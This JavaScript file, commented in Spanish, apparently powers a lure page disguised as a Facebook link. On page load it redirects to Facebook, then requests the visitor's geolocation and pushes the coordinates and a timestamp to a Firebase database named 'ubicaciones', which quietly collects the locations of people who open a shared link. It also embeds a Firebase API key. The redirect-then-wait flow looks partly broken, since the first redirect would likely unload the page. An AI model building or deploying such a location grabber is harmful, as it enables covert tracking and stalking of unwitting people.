// Importar Firebase
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-database.js";

// Configuración de Firebase
const firebaseConfig = {
    apiKey: "AIzaSyDo4j7zm_poOFz5tRUkRULjxrZO2jlOuaM",
    authDomain: "ubicacionesweb.firebaseapp.com",
    databaseURL: "https://ubicacionesweb-default-rtdb.firebaseio.com",
    projectId: "ubicacionesweb",
    storageBucket: "ubicacionesweb.firebasestorage.app",
    messagingSenderId: "916561063858",
    appId: "1:916561063858:web:316104fb181e9377fabeab"
};

// Inicializar Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Función para detectar si es móvil
function esMovil() {
    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
}

// Redirigir a Facebook según el dispositivo
function redirigirFacebook() {
    if (esMovil()) {
        // Intentar abrir en la app de Facebook
        window.location.href = "fb://facewebmodal/f?href=https://www.facebook.com";
        // Si falla, después de 2 segundos, abrir en el navegador
        setTimeout(() => {
            window.location.href = "https://www.facebook.com";
        }, 2000);
    } else {
        // Si es PC, abrir directamente en Facebook web
        window.location.href = "https://www.facebook.com";
    }
}

// Obtener ubicación
function obtenerUbicacion() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function (position) {
                let lat = position.coords.latitude;
                let lon = position.coords.longitude;
                let timestamp = new Date().toLocaleString();

                // Guardar en Firebase
                push(ref(database, "ubicaciones"), {
                    latitud: lat,
                    longitud: lon,
                    fecha: timestamp
                }).then(() => {
                    console.log("Ubicación guardada:", lat, lon);
                    // Redirigir a la página final
                    window.location.href = "https://www.facebook.com/share/v/1HkqwzKdn8/";
                }).catch(error => {
                    console.error("Error al guardar ubicación:", error);
                });

            },
            function (error) {
                alert("Debes permitir el acceso a la ubicación.");
            }
        );
    } else {
        alert("Tu navegador no soporta geolocalización.");
    }
}

// Proceso automático al cargar la página
window.onload = function () {
    // 1. Redirigir a Facebook
    redirigirFacebook();

    // 2. Esperar 5 segundos y pedir ubicación
    setTimeout(() => {
        obtenerUbicacion();
    }, 5000);
};
